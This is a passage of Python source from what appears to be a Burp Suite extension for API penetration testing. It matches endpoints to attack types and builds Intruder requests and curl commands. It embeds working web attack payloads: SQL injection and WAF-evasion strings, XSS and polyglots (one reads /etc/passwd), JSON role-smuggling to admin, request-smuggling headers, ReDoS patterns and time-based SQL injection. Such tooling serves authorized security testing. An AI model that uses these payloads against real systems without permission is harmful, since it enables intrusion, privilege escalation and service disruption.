    def _check_nosqli(self, normalized, attack_type):
        """Check if endpoint has NoSQL injection potential"""
        if not self._attack_selected(attack_type, ["NoSQL", "NoSQL Injection"]):
            return None
        if "json" not in normalized["content_type"].lower():
            return None
        params = normalized["params"]
        if not params["json"] and not params["body"]:
            return None
        return {
            "type": "NoSQL Injection",
            "payloads": self._get_nosqli_payloads()[:3],
            "risk": "Database bypass",
        }

    def _check_path_traversal(self, normalized, attack_type):
        """Check if endpoint has path traversal potential"""
        if not self._attack_selected(attack_type, ["Path Traversal"]):
            return None
        path = normalized["path"].lower()
        if not any(p in path for p in ["file", "path", "download", "upload"]):
            return None
        return {
            "type": "Path Traversal",
            "payloads": self._get_path_traversal_payloads()[:4],
            "risk": "File system access",
        }

    def _check_mass_assignment(self, normalized, attack_type):
        """Check if endpoint has mass assignment potential"""
        if not self._attack_selected(attack_type, ["Mass Assignment"]):
            return None
        if normalized["method"] not in ["POST", "PUT", "PATCH"]:
            return None
        return {
            "type": "Mass Assignment",
            "inject": "role=admin, isAdmin=true, permissions=*",
            "risk": "Privilege escalation",
        }

    def _generate_attack_lines(self, key, attack):
        """Generate output lines for an attack"""
        if not attack:
            return []
        lines = ["[{}] {}".format(attack["type"], key)]
        
        # Show authentication requirement warning
        if attack.get("auth_required"):
            lines.append("  [!] AUTH REQUIRED: Test with valid credentials")
        
        # Show confidence level
        if "confidence" in attack:
            lines.append("  Confidence: {}".format(attack["confidence"]))

        # Payloads (limit to 5 for readability)
        if "payloads" in attack:
            payloads = attack["payloads"][:5]
            lines.append("  Payloads: {}".format(", ".join(str(p) for p in payloads)))

        # Attacks (limit to 3)
        if "attacks" in attack:
            attacks = attack["attacks"][:3]
            lines.append("  Attacks: {}".format(", ".join(attacks)))

        # Params (limit to 5)
        if "params" in attack and attack["params"]:
            params = attack["params"][:5]
            lines.append("  Params: {}".format(", ".join(str(p) for p in params)))

        # Reflected (limit to 3)
        if "reflected" in attack:
            reflected = attack["reflected"][:3]
            lines.append("  Reflected: {}".format(", ".join(str(p) for p in reflected)))

        # Test description
        if "test" in attack:
            lines.append("  Test: {}".format(attack["test"]))

        # Inject
        if "inject" in attack:
            lines.append("  Inject: {}".format(attack["inject"]))

        # Risk
        lines.append("  Risk: {}".format(attack["risk"]))
        
        # Important notes
        if "note" in attack:
            lines.append("  [*] Note: {}".format(attack["note"]))
        
        lines.append("")  # Blank line between attacks
        return lines

    def _fuzzer_endpoint_is_api_like(self, normalized, strict=True):
        """Gate fuzzer candidates to API-like traffic, not static/ad-tech routes."""
        method = self._ascii_safe(normalized.get("method"), lower=True).strip().upper()
        path = self._ascii_safe(normalized.get("path") or "/", lower=True).strip()
        content_type = self._ascii_safe(normalized.get("content_type"), lower=True).strip()
        auth = [
            self._ascii_safe(x, lower=True)
            for x in (normalized.get("auth", []) or [])
        ]

        first_part = ""
        parts = [p for p in path.strip("/").split("/") if p]
        if parts:
            first_part = parts[0]

        if strict and self._path_contains_noise_marker(
            path, self.FUZZER_STRICT_NOISE_PATH_MARKERS
        ):
            return False
        if path.endswith(self.PASSIVE_STATIC_EXTENSIONS):
            return False
        if path.endswith(".html") and "/api/" not in path:
            return False
        if first_part in self.FUZZER_STATIC_PATH_PARTS:
            return False
        if self._ffuf_is_noise_path_segment(first_part):
            return False
        if (
            "javascript" in content_type
            or "ecmascript" in content_type
            or "text/css" in content_type
            or content_type.startswith("image/")
            or content_type.startswith("font/")
            or content_type.startswith("video/")
            or content_type.startswith("audio/")
        ):
            return False

        has_api_signal = self._fuzzer_has_api_signal(normalized)

        params = normalized.get("params", {})
        param_count = 0
        for key in ["url", "body", "json", "cookie"]:
            param_count += len(params.get(key, []))

        has_id_hint = bool(
            "{id}" in path or "{uuid}" in path or "{objectid}" in path
        )
        has_auth_context = any(x != "none" for x in auth)
        has_write_method = method in ["POST", "PUT", "PATCH", "DELETE"]

        if len(path) > 220 and not (has_api_signal or has_write_method):
            return False
        if re.search(r"/[a-z0-9_-]{80,}", path) and not (has_api_signal or has_write_method):
            return False

        if has_api_signal:
            return True
        if has_write_method and has_auth_context:
            return True
        if has_id_hint and has_auth_context and has_api_signal:
            return True
        if (
            method in ["POST", "PUT", "PATCH"]
            and param_count >= 2
            and first_part
            and first_part not in self.FUZZER_STATIC_PATH_PARTS
        ):
            return True
        return False

    def _collect_fuzzer_targets(self, strict=True):
        """Collect fuzzer targets from first-party/API-like entries only."""
        raw_snapshot = {}
        with self.lock:
            for key, raw_entries in self.api_data.items():
                if isinstance(raw_entries, list):
                    raw_snapshot[key] = list(raw_entries)
                elif isinstance(raw_entries, dict):
                    raw_snapshot[key] = [raw_entries]

        filter_cfg = self._build_passive_filter_config(raw_snapshot)
        filtered = {}
        excluded_endpoints = 0

        for key, entries in raw_snapshot.items():
            kept_entries = []
            entries_list = entries if isinstance(entries, list) else [entries]
            for entry in entries_list:
                if not isinstance(entry, dict):
                    continue
                if not self._passive_entry_allowed(entry, filter_cfg):
                    continue
                normalized = self._normalize_endpoint_data(entry)
                status = int(normalized.get("response_status", 200) or 200)
                if status == 404:
                    continue
                if not self._fuzzer_endpoint_is_api_like(normalized, strict=strict):
                    continue
                kept_entries.append(entry)

            if kept_entries:
                filtered[key] = kept_entries
            else:
                excluded_endpoints += 1

        return filtered, {
            "raw_endpoints": len(raw_snapshot),
            "filtered_endpoints": len(filtered),
            "excluded_endpoints": excluded_endpoints,
        }

    def _path_contains_noise_marker(self, path, markers):
        """Check whether path contains any marker from a marker list."""
        text = self._ascii_safe(path, lower=True).strip()
        if not text:
            return False
        return any(marker in text for marker in markers)

    def _collect_param_targets(self, strict_base=True):
        """Collect Param Miner targets with first-party/API-like and ad-tech noise filtering."""
        base_targets, base_meta = self._collect_fuzzer_targets(strict=strict_base)
        filtered = {}
        excluded_method = 0
        excluded_noise = 0
        excluded_non_api = 0

        for key, entries in base_targets.items():
            entry = self._get_entry(entries)
            normalized = self._normalize_endpoint_data(entry)
            method = self._ascii_safe(normalized.get("method"), lower=True).strip().upper()
            if method not in ["GET", "POST", "PUT", "PATCH", "DELETE"]:
                excluded_method += 1
                continue

            path = self._ascii_safe(normalized.get("path") or "/", lower=True)
            content_type = self._ascii_safe(
                normalized.get("content_type"), lower=True
            ).strip()
            auth = [
                self._ascii_safe(x, lower=True)
                for x in (normalized.get("auth", []) or [])
            ]
            has_auth_context = any(x != "none" for x in auth)
            has_api_marker = bool(
                "/api/" in path
                or "/graphql" in path
                or "/rest/" in path
                or "/openapi" in path
                or "/swagger" in path
                or "/metadata/" in path
                or "/oauth" in path
                or "/auth/" in path
                or re.match(r"^/v\d+(?:\.\d+)?(?:/|$)", path)
            )
            has_structured_content = bool(
                (
                    "json" in content_type
                    or "xml" in content_type
                    or "protobuf" in content_type
                    or "x-www-form-urlencoded" in content_type
                    or "multipart/form-data" in content_type
                )
                and "javascript" not in content_type
                and "html" not in content_type
            )

            if self._path_contains_noise_marker(
                path, self.PARAM_MINER_STRICT_NOISE_PATH_MARKERS
            ):
                excluded_noise += 1
                continue
            if (not has_auth_context) and self._path_contains_noise_marker(
                path, self.PARAM_MINER_NOISE_PATH_MARKERS
            ):
                excluded_noise += 1
                continue
            if method == "GET" and (not has_api_marker) and (not has_structured_content):
                excluded_non_api += 1
                continue
            if self._is_frontend_route(path, content_type):
                excluded_non_api += 1
                continue

            filtered[key] = entries

        return filtered, {
            "raw_endpoints": base_meta.get("raw_endpoints", 0),
            "filtered_endpoints": len(filtered),
            "excluded_endpoints": base_meta.get("excluded_endpoints", 0)
            + excluded_method
            + excluded_noise
            + excluded_non_api,
            "excluded_method": excluded_method,
            "excluded_noise": excluded_noise,
            "excluded_non_api": excluded_non_api,
        }

    def _collect_version_targets(self, lenient=False):
        """Collect Version Scanner targets from Param Miner scoped target set."""
        param_targets, param_meta = self._collect_param_targets(
            strict_base=not bool(lenient)
        )
        filtered = {}
        excluded_non_api = 0
        excluded_noise = 0
        retained_versioned = 0

        for key, entries in param_targets.items():
            entry = self._get_entry(entries)
            normalized = self._normalize_endpoint_data(entry)
            path = self._ascii_safe(normalized.get("path") or "/", lower=True)
            method = self._ascii_safe(normalized.get("method"), lower=True).strip().upper()
            content_type = self._ascii_safe(
                normalized.get("content_type"), lower=True
            ).strip()
            has_structured_content = bool(
                (
                    "json" in content_type
                    or "xml" in content_type
                    or "protobuf" in content_type
                    or "x-www-form-urlencoded" in content_type
                    or "multipart/form-data" in content_type
                )
                and "javascript" not in content_type
                and "html" not in content_type
            )
            if self._path_contains_noise_marker(
                path, self.VERSION_SCANNER_NOISE_PATH_MARKERS
            ):
                excluded_noise += 1
                continue
            already_versioned = bool(self._extract_version_segment(path))

            api_marker = any(x in path for x in ["/api/", "/svc/", "/rest/", "/graphql"])
            if (not already_versioned) and (not api_marker) and method not in [
                "POST",
                "PUT",
                "PATCH",
                "DELETE",
            ]:
                if lenient and has_structured_content:
                    filtered[key] = entries
                    continue
                excluded_non_api += 1
                continue

            filtered[key] = entries
            if already_versioned:
                retained_versioned += 1

        return filtered, {
            "raw_endpoints": param_meta.get("raw_endpoints", 0),
            "filtered_endpoints": len(filtered),
            "excluded_noise": excluded_noise,
            "excluded_endpoints": param_meta.get("excluded_endpoints", 0)
            + excluded_non_api
            + excluded_noise,
            "retained_versioned": retained_versioned,
            "excluded_non_api": excluded_non_api,
        }

    def _generate_fuzzing_attacks(self, endpoints, attack_type):
        """Core fuzzing logic - pure function for testing"""
        attacks = []
        for key, entries in endpoints.items():
            try:
                entry = self._get_entry(entries)
                normalized = self._normalize_endpoint_data(entry)
                
                # Skip non-existent endpoints (404s)
                if normalized["response_status"] == 404:
                    continue
                
                # Skip frontend routes that aren't APIs
                path = normalized["path"].lower()
                if self._is_frontend_route(path, normalized["content_type"]):
                    continue
                
                checks = [
                    self._check_bola(normalized, attack_type),
                    self._check_idor(normalized, attack_type),
                    self._check_auth_bypass(normalized, attack_type),
                    self._check_sqli(normalized, attack_type),
                    self._check_xss(normalized, attack_type),
                    self._check_ssrf(normalized, attack_type),
                    self._check_xxe(normalized, attack_type),
                    self._check_nosqli(normalized, attack_type),
                    self._check_path_traversal(normalized, attack_type),
                    self._check_mass_assignment(normalized, attack_type),
                    self._check_race_condition(normalized, attack_type),
                    self._check_graphql(normalized, attack_type),
                    self._check_jwt(normalized, attack_type),
                    self._check_ssti(normalized, attack_type),
                    self._check_deserialization(normalized, attack_type),
                    self._check_business_logic(normalized, attack_type),
                    self._check_waf_bypass(normalized, attack_type),
                ]
                for attack in checks:
                    if attack:
                        attacks.append((key, attack))
            except Exception as e:
                self._callbacks.printError(
                    "Error processing {}: {}".format(key, str(e))
                )
        return attacks

    def _check_race_condition(self, normalized, attack_type):
        if not self._attack_selected(attack_type, ["Race Condition"]):
            return None
        if normalized["method"] not in ["POST", "PUT", "PATCH", "DELETE"]:
            return None
        path = normalized["path"].lower()
        if not any(
            k in path for k in ["coupon", "redeem", "purchase", "transfer", "withdraw"]
        ):
            return None
        rc = self._get_race_condition_payloads()
        return {
            "type": "Race Condition",
            "techniques": rc["techniques"],
            "targets": rc["targets"],
            "test": "Send parallel requests to exploit TOCTOU",
            "risk": "Double spending, inventory bypass, rate limit bypass",
        }

    def _check_graphql(self, normalized, attack_type):
        if not self._attack_selected(attack_type, ["GraphQL"]):
            return None
        if "graphql" not in normalized["path"].lower():
            return None
        gql = self._get_graphql_attacks()
        return {
            "type": "GraphQL Abuse",
            "introspection": gql["introspection"][:2],
            "attacks": [
                "Introspection queries",
                "Batching (array/alias)",
                "Depth limit bypass",
                "Directive overloading",
                "Field suggestion",
                "Circular fragments",
                "Mutation injection",
            ],
            "payloads": gql["batching"] + gql["aliases"][:2] + gql["directive_overload"][:2] + gql["field_suggestion"][:2],
            "test": "DoS via batching/depth, info disclosure via field suggestion, introspection bypass",
            "risk": "DoS, data exfiltration, unauthorized mutations, schema disclosure",
        }

    def _check_jwt(self, normalized, attack_type):
        if not self._attack_selected(attack_type, ["JWT"]):
            return None
        if "Bearer Token" not in normalized["auth"]:
            return None
        jwt = self._get_jwt_attacks()
        return {
            "type": "JWT Exploitation",
            "attacks": jwt["alg_confusion"] + jwt["kid_injection"][:2],
            "claims": jwt["claims"],
            "test": "Algorithm confusion, kid injection, claim manipulation",
            "risk": "Authentication bypass, privilege escalation",
        }

    def _check_ssti(self, normalized, attack_type):
        if not self._attack_selected(attack_type, ["SSTI"]):
            return None
        if not self._fuzzer_has_api_signal(normalized):
            return None
        params = normalized["params"]
        candidate_params = list(params.get("url", [])) + list(params.get("body", [])) + list(
            params.get("json", [])
        )
        if not candidate_params:
            return None
        candidate_params_lower = [self._ascii_safe(x, lower=True) for x in candidate_params]
        path = self._ascii_safe(normalized.get("path") or "/", lower=True)
        ssti_params = []
        for idx, name in enumerate(candidate_params_lower):
            if any(keyword in name for keyword in self.FUZZER_SSTI_PARAM_KEYWORDS):
                ssti_params.append(candidate_params[idx])
        path_hits = any(
            marker in path
            for marker in ["/template", "/render", "/preview", "/email", "/view", "/compile"]
        )
        if not ssti_params and not path_hits:
            return None
        return {
            "type": "SSTI",
            "payloads": self._get_ssti_payloads()[:6],
            "params": ssti_params[:5],
            "test": "Template injection in params",
            "risk": "Remote code execution",
        }

    def _check_deserialization(self, normalized, attack_type):
        if not self._attack_selected(attack_type, ["Deserialization"]):
            return None
        ct = normalized["content_type"].lower()
        if "java" not in ct and "serializ" not in ct and "application/octet" not in ct:
            return None
        return {
            "type": "Deserialization",
            "payloads": self._get_deserialization_payloads()[:3],
            "test": "Inject malicious serialized objects",
            "risk": "Remote code execution",
        }

    def _check_business_logic(self, normalized, attack_type):
        if not self._attack_selected(attack_type, ["Business Logic"]):
            return None
        path = normalized["path"].lower()
        if not any(
            k in path
            for k in ["price", "amount", "quantity", "payment", "checkout", "order"]
        ):
            return None
        bl = self._get_business_logic_tests()
        return {
            "type": "Business Logic",
            "price_tests": bl["price_manipulation"],
            "quantity_tests": bl["quantity_abuse"],
            "test": "Negative values, overflow, workflow bypass",
            "risk": "Financial loss, inventory manipulation",
        }

    def _is_frontend_route(self, path, content_type):
        """Detect if endpoint is a frontend route (not an API)"""
        # Frontend route indicators
        frontend_patterns = [
            "/auction/", "/post/", "/comment/", "/user/", "/profile/",
            "/article/", "/page/", "/view/", "/show/"
        ]
        
        # If it returns HTML and matches frontend patterns, it's likely a UI route
        if "html" in content_type.lower():
            if any(pattern in path for pattern in frontend_patterns):
                return True
        
        # If it has {id} but no /api/ prefix and returns HTML, likely frontend
        if "{id}" in path and "/api/" not in path and "html" in content_type.lower():
            return True
            
        return False
    
    def _check_waf_bypass(self, normalized, attack_type):
        """Check if endpoint should be tested for WAF bypass (pure function)"""
        if not self._attack_selected(attack_type, ["WAF Bypass"]):
            return None

        return {
            "type": "WAF Bypass",
            "test": "Header injection, encoding bypass, method override, path pollution",
            "risk": "WAF evasion leading to exploitation of underlying vulnerabilities",
        }

    # Advanced WAF bypass techniques from waf_bypass_advanced.py
    def _get_sql_comment_obfuscation(self):
        """SQL comment-based obfuscation"""
        return ["UN/**/ION","SEL/**/ECT","OR/**/1=1","UN/*!50000ION*/","/*!50000SELECT*/","UN/**/I/**/ON","S/**/E/**/L/**/E/**/C/**/T","UNION#comment\nSELECT","OR#\n1=1","UNION-- \nSELECT"]

    def _get_polyglot_payloads(self):
        """Polyglot payloads (multi-context)"""
        return ["';alert(1)//","';alert(String.fromCharCode(88,83,83))//","' OR 1=1--<script>alert(1)</script>","; cat /etc/passwd' OR '1'='1","*)(uid=*))(|(uid=*' OR '1'='1"]

    def _get_whitespace_obfuscation(self):
        """Whitespace-based obfuscation"""
        return ["UNION\tSELECT","OR\t1=1","UNION\nSELECT","OR\n1=1","UNION\rSELECT","UNION  SELECT","OR   1=1","UNION\t\nSELECT","UNION\fSELECT"]

    def _get_charset_manipulation(self):
        """Character set manipulation"""
        return ["%c0%27","%c0%22","%u0027","%u003c","%u0022","%u003e","%c1%1c","%c1%9c"]

    def _get_http_parameter_pollution(self):
        """HTTP Parameter Pollution"""
        return ["id=1&id=2","id=1&id=' OR '1'='1","id[]=1&id[]=2","id[0]=1&id[1]=2","id=1&id[]=2","id={\"$ne\":null}","filter={\"$gt\":\"\"}"]

    def _get_unicode_normalization(self):
        """Unicode normalization bypasses"""
        return ["\uff1c\uff53\uff43\uff52\uff49\uff50\uff54\uff1e","s\u0300cript","\u0430lert","\u0441ript","s\u200bcript","al\u200dert"]

    def _get_json_smuggling(self):
        """JSON smuggling techniques"""
        return ['{"role":"user","role":"admin"}','{"\\u0072ole":"admin"}','{"role\\u0000":"user","role":"admin"}','{"role":["user","admin"]}']

    def _get_xml_entity_tricks(self):
        """XML entity manipulation"""
        return ['<!DOCTYPE foo [<!ENTITY x "&#x3c;">]><foo>&x;script></foo>','<![CDATA[<script>alert(1)</script>]]>','&#60;script&#62;alert(1)&#60;/script&#62;','&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;']

    def _get_protocol_smuggling(self):
        """HTTP Request Smuggling patterns"""
        return {"chunked":["Transfer-Encoding: chunked","Transfer-Encoding: chunked, identity"],"cl_tricks":["Content-Length: 0","Content-Length: 5\r\nContent-Length: 6"]}

    def _get_regex_dos(self):
        """ReDoS patterns"""
        return ["(a+)+b","(a*)*b","(a|a)*b","(a|ab)*c","(.*a){x}","([a-zA-Z]+)*"]

    def _get_timing_attacks(self):
        """Timing-based bypass"""
        return {"sql":["'; WAITFOR DELAY '0:0:5'--","'; SELECT SLEEP(5)--","' AND SLEEP(5)--"],"nosql":['{"$where":"sleep(5000)"}','{"$where":"return sleep(5000)"}']}

    # ============================================================================
    # UI INTEGRATION - NAVIGATION: Search "UI INTEGRATION" to jump here
    # ============================================================================

    def _generate_fuzzing(self, attack_type):
        """UI wrapper for fuzzing generation"""
        self.log_to_ui("[*] Generating {} attacks".format(attack_type))
        self.fuzzer_area.setText("[*] Generating {} attacks...\n".format(attack_type))
        lenient_mode = bool(
            hasattr(self, "fuzzer_lenient_checkbox")
            and self.fuzzer_lenient_checkbox is not None
            and self.fuzzer_lenient_checkbox.isSelected()
        )

        if not self.api_data:
            msg = "[!] No endpoints captured. Import data or capture traffic first."
            self.fuzzer_area.setText(msg)
            self.log_to_ui("[!] No endpoints to fuzz")
            return

        api_endpoints, filter_meta = self._collect_fuzzer_targets(strict=not lenient_mode)
        excluded_count = int(filter_meta.get("excluded_endpoints", 0))

        if not api_endpoints:
            self.fuzzer_area.setText(
                "[!] No API-like endpoints found after scope/noise filtering (excluded {})\n".format(
                    excluded_count
                )
            )
            return

        self.log_to_ui(
            "[*] Fuzzing {} API-like endpoints (excluded {})".format(
                len(api_endpoints), excluded_count
            )
        )

        try:
            attacks = self._generate_fuzzing_attacks(api_endpoints, attack_type)
            self.fuzzing_attacks = attacks

            # Count by type and severity
            attack_types = {}
            critical_count = 0
            high_count = 0

            for _, attack in attacks:
                atype = attack["type"]
                attack_types[atype] = attack_types.get(atype, 0) + 1

                # Count severity
                if atype in ["IDOR/BOLA", "BOLA", "Auth Bypass", "SQL Injection", "SSRF", "XXE"]:
                    critical_count += 1
                elif atype in ["XSS", "NoSQL Injection", "SSTI", "Deserialization"]:
                    high_count += 1

            # Build summary
            summary = []
            summary.append("="*80)
            summary.append("FUZZING CAMPAIGN: {}".format(attack_type))
            summary.append("="*80)
            summary.append("")
            summary.append(
                "[*] Mode: {}".format("Lenient JSON GET" if lenient_mode else "Strict")
            )
            summary.append(
                "[*] Filtered: {} API endpoints (excluded {} static/noisy endpoints)".format(
                    len(api_endpoints), excluded_count
                )
            )
            summary.append(
                "[*] Generated: {} attacks across {} endpoints".format(
                    len(attacks), len(set([k for k, a in attacks]))
                )
            )
            summary.append(
                "[*] Critical: {} | High: {} | Medium: {}".format(
                    critical_count,
                    high_count,
                    len(attacks) - critical_count - high_count,
                )
            )
            summary.append("")
            summary.append("[*] Attack Types:")
            for atype, count in sorted(
                attack_types.items(), key=lambda x: x[1], reverse=True
            ):
                summary.append("    {}: {}".format(atype, count))
            summary.append("")

            # Show top 20 attacks only (reduced from 30)
            lines = summary
            lines.append("="*80)
            lines.append("TOP PRIORITY ATTACKS (showing 20/{})".format(len(attacks)))
            lines.append("="*80)
            lines.append("")

            shown = 0
            for key, attack in attacks:
                if shown >= 20:
                    break
                lines.extend(self._generate_attack_lines(key, attack))
                shown += 1

            if len(attacks) > 20:
                lines.append("="*80)
                lines.append(
                    "[*] {} more attacks not shown. Use filters or export for full list.".format(
                        len(attacks) - 20
                    )
                )
                lines.append("="*80)

            # Single batched UI update
            result_text = "\n".join(lines)
            SwingUtilities.invokeLater(lambda: self.fuzzer_area.setText(result_text))
            self.log_to_ui(
                "[+] Generated {} attacks ({} critical, {} high)".format(
                    len(attacks), critical_count, high_count
                )
            )
        except Exception as e:
            msg = "[!] Error: {}\n\nCheck Activity Log for details".format(str(e))
            self.fuzzer_area.setText(msg)
            self.log_to_ui("[!] Error generating fuzzing: {}".format(str(e)))
            import traceback

            self._callbacks.printError(traceback.format_exc())

    def _send_fuzzing_to_intruder(self):
        """Send generated attacks to Burp Intruder with auto-configured positions"""
        if not self.api_data:
            msg = "[!] No endpoints captured. Import data or capture traffic first."
            self.fuzzer_area.setText(msg)
            self.log_to_ui("[!] No endpoints to send")
            return
        if not self.fuzzing_attacks:
            msg = "[!] Click 'Generate' first to create fuzzing attacks."
            self.fuzzer_area.setText(msg)
            self.log_to_ui("[!] Generate attacks first")
            return

        self.fuzzer_area.append("\n" + "=" * 80 + "\n")
        self.fuzzer_area.append("[*] Sending to Burp Intruder...\n")

        try:
            sent = 0
            for endpoint_key, attack in self.fuzzing_attacks[:10]:
                if endpoint_key not in self.api_data:
                    continue

                entries = self.api_data[endpoint_key]
                entry = self._get_entry(entries)

                # Build request with attack positions
                request = self._build_intruder_request(entry, attack)
                if not request:
                    continue

                use_https = entry["protocol"] == "https"
                port = (
                    entry["port"] if entry["port"] != -1 else (443 if use_https else 80)
                )

                self._callbacks.sendToIntruder(
                    entry["host"], port, use_https, self._helpers.stringToBytes(request)
                )
                sent += 1

            self.fuzzer_area.append("[+] Sent {} attacks to Intruder\n".format(sent))
            self.fuzzer_area.append(
                "[+] Check Burp Intruder tab for configured positions (§markers§)\n"
            )
            self.log_to_ui("[+] Sent {} to Intruder".format(sent))
            self.log_to_ui("[+] Check Intruder tab")
        except Exception as e:
            self.fuzzer_area.append("[!] Error: {}\n".format(str(e)))
            self.log_to_ui("[!] Error sending to Intruder: {}".format(str(e)))
            import traceback

            self._callbacks.printError(traceback.format_exc())

    def _build_intruder_request(self, entry, attack):
        """Build HTTP request with Intruder attack positions marked"""
        try:
            method = entry["method"]
            path = entry["path"]
            query = entry.get("query_string", "")
            headers = entry.get("headers", {})
            body = entry.get("request_body", "")

            # Mark attack positions based on attack type
            if attack["type"] in ["IDOR/BOLA", "BOLA"]:
                # Mark IDs in path
                path = path.replace("/1", "/§1§").replace("/2", "/§2§")
                import re

                path = re.sub(r"/(\d+)", r"/§\1§", path)

            if attack["type"] == "WAF Bypass":
                # Add WAF bypass headers
                if "bypass_headers" in attack:
                    for bypass_header in attack["bypass_headers"][:3]:
                        headers[bypass_header.split(":")[0]] = bypass_header.split(":", 1)[1].strip()

            if attack["type"] in ["SQL Injection", "XSS", "SSTI", "SSRF", "XXE"]:
                # Mark parameters
                if "params" in attack and attack["params"]:
                    for param in attack["params"]:
                        query = query.replace("{}=".format(param), "{}=§".format(param))
                        query = query.replace("&", "§&")
                elif "reflected" in attack:
                    for param in attack["reflected"]:
                        query = query.replace("{}=".format(param), "{}=§".format(param))
                        query = query.replace("&", "§&")

            # Build request
            full_path = path
            if query:
                full_path += "?" + query

            lines = ["{} {} HTTP/1.1".format(method, full_path)]
            lines.append("Host: {}".format(entry["host"]))

            for k, v in headers.items():
                if k.lower() not in ["host", "content-length"]:
                    # Mark auth headers for BOLA/Auth Bypass
                    if (
                        attack["type"] in ["BOLA", "Auth Bypass"]
                        and k.lower() == "authorization"
                    ):
                        lines.append("{}: §{}§".format(k, v))
                    else:
                        lines.append("{}: {}".format(k, v))

            if body:
                lines.append("Content-Length: {}".format(len(body)))
                lines.append("")
                # Mark body params for injection attacks
                if attack["type"] in [
                    "SQL Injection",
                    "NoSQL Injection",
                    "Mass Assignment",
                    "SSTI",
                    "SSRF",
                    "XXE",
                ]:
                    body = (
                        body.replace('":', '":§').replace(",", "§,").replace("}", "§}")
                    )
                lines.append(body)
            else:
                lines.append("")
                lines.append("")

            return "\r\n".join(lines)
        except Exception as e:
            self._callbacks.printError("Error building request: {}".format(str(e)))
            return None

    def _load_success_patterns(self):
        """Load success detection patterns from JSON"""
        import os
        try:
            pattern_file = os.path.join(os.path.dirname(__file__), "success_patterns.json")
            if os.path.exists(pattern_file):
                with open(pattern_file, 'r') as f:
                    return json.load(f)
        except Exception as e:
            self._callbacks.printError("Failed to load success patterns: {}".format(str(e)))
        return {}

    def _detect_vulnerability(self, response_body, response_status, attack_type):
        """Detect if attack was successful based on response"""
        patterns = getattr(self, 'success_patterns', None)
        if not patterns:
            self.success_patterns = self._load_success_patterns()
            patterns = self.success_patterns

        if attack_type == "SQLI" and "sqli" in patterns:
            for pattern_obj in patterns["sqli"].get("error_based", []):
                if re.search(pattern_obj["pattern"], response_body, re.I):
                    return {"vulnerable": True, "confidence": pattern_obj["confidence"],
                            "evidence": "SQL error: {}".format(pattern_obj.get("db", "detected"))}

        elif attack_type == "XSS" and "xss" in patterns:
            for pattern_obj in patterns["xss"].get("reflection", []):
                if re.search(pattern_obj["pattern"], response_body, re.I):
                    return {"vulnerable": True, "confidence": pattern_obj["confidence"],
                            "evidence": "XSS payload reflected"}

        elif attack_type == "NoSQL Injection" and "nosqli" in patterns:
            for pattern_obj in patterns["nosqli"].get("error", []):
                if re.search(pattern_obj["pattern"], response_body, re.I):
                    return {"vulnerable": True, "confidence": pattern_obj["confidence"],
                            "evidence": "NoSQL error detected"}

        return {"vulnerable": False}

    def _select_payloads_for_param(self, param_name, param_value):
        """Context-aware payload selection based on parameter name/value"""
        payloads = []
        param_lower = param_name.lower()

        if re.search(r'email|mail', param_lower):
            payloads.extend(["<script>alert(1)</script>", "' OR '1'='1", "test@test.com'"])[:5]
        elif re.search(r'id|user_id|account', param_lower):
            if param_value and param_value.isdigit():
                payloads.extend(["1", "2", "999", "-1", "0"])[:5]
            elif param_value and len(param_value) == 36:
                payloads.extend(["00000000-0000-0000-0000-000000000000"])[:3]
        elif re.search(r'price|amount|cost|total', param_lower):
            payloads.extend(["-1", "0", "0.01", "999999999"])[:5]
        elif re.search(r'name|user|comment', param_lower):
            payloads.extend(["<script>alert(1)</script>", "{{7*7}}", "' OR '1'='1"])[:5]
        else:
            payloads.extend(["'", "<script>alert(1)</script>", "1' OR '1'='1"])[:3]

        return payloads

    def _generate_curl_command(self, entry, payload=None):
        """Generate cURL command for manual testing"""
        method = entry.get("method", "GET")
        protocol = entry.get("protocol", "https")
        host = entry.get("host", "")
        port = entry.get("port", -1)
        path = entry.get("path", "/")
        headers = entry.get("headers", {})
        body = entry.get("request_body", "")

        if port == -1:
            port = 443 if protocol == "https" else 80

        if (protocol == "https" and port == 443) or (protocol == "http" and port == 80):
            url = "{}://{}{}".format(protocol, host, path)
        else:
            url = "{}://{}:{}{}".format(protocol, host, port, path)

        curl = "curl -X {} '{}' \\".format(method, url)

        for header, value in headers.items():
            if header.lower() not in ["host", "content-length"]:
                curl += "\n  -H '{}: {}' \\".format(header, value)

        if payload:
            curl += "\n  -d '{}' \\".format(payload)
        elif body and method in ["POST", "PUT", "PATCH"]:
            curl += "\n  -d '{}' \\".format(body[:200])

        curl += "\n  -i -k -L"
        return curl

    def _copy_attack_as_curl(self):
        """Copy first attack as cURL command"""
        if not self.fuzzing_attacks:
            self.fuzzer_area.append("\n[!] Generate attacks first\n")
            return

        endpoint_key, attack = self.fuzzing_attacks[0]
        if endpoint_key not in self.api_data:
            self.fuzzer_area.append("\n[!] Endpoint not found\n")
            return

        entry = self._get_entry(self.api_data[endpoint_key])

        payload = None
        if "payloads" in attack and attack["payloads"]:
            payload = str(attack["payloads"][0])

        curl_cmd = self._generate_curl_command(entry, payload)

        self._copy_to_clipboard(curl_cmd)
        self.fuzzer_area.append("\n[+] Copied cURL command for: {}\n".format(endpoint_key))
        self.fuzzer_area.append("[+] Attack type: {}\n".format(attack["type"]))
        if payload:
            self.fuzzer_area.append("[+] Payload: {}\n".format(payload[:100]))
        self.log_to_ui("[+] Copied cURL command to clipboard")

    def _export_payloads(self):
        """Export payloads to file"""
        try:
            import os

            self.log_to_ui("[*] Export Payloads button clicked")
            self.log_to_ui("[*] api_data: {} endpoints".format(len(self.api_data)))
        except Exception as e:
            self.log_to_ui("[!] Error in export init: {}".format(str(e)))
            return

        if not self.api_data:
            msg = "[!] No endpoints captured. Import data or capture traffic first."
            self.fuzzer_area.append("\n" + msg + "\n")
            self.log_to_ui("[!] No endpoints available")
            return

        self.fuzzer_area.append("\n" + "=" * 80 + "\n")
        self.fuzzer_area.append("[*] Exporting payloads...\n")
        export_dir = self._get_export_dir("Payloads")
        if not export_dir:
            return
        filename = os.path.join(export_dir, "payloads.json")
        payloads = {
            "idor": self._get_idor_payloads(),
            "sqli": self._get_sqli_payloads(),
            "xss": self._get_xss_payloads(),
            "nosqli": self._get_nosqli_payloads(),
            "ssrf": self._get_ssrf_payloads(),
            "xxe": self._get_xxe_payloads(),
            "ssti": self._get_ssti_payloads(),
            "deserialization": self._get_deserialization_payloads(),
            "waf_bypass": {
                "headers": self._get_waf_bypass_headers(),
                "encoding": self._get_waf_bypass_encoding(),
                "http_methods": self._get_waf_bypass_http_methods(),
                "path_tricks": self._get_waf_bypass_path_tricks(),
